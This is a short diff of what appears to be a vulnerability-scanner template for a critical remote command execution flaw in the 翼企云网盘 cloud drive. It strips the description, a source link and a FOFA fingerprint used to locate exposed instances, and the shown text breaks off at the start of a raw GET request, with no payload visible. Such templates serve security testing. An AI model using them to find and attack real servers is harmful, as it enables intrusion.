@@ -3,12 +3,8 @@ info:
   name: 翼企云网盘 index存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zawot5yyty7n50d6'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zawot5yyty7n50d6
-    fofa: body="frontend/runtime.1975ec1eb449b67199b3.js"
 http:
 - raw:
   - 'GET /index.php HTTP/1.1
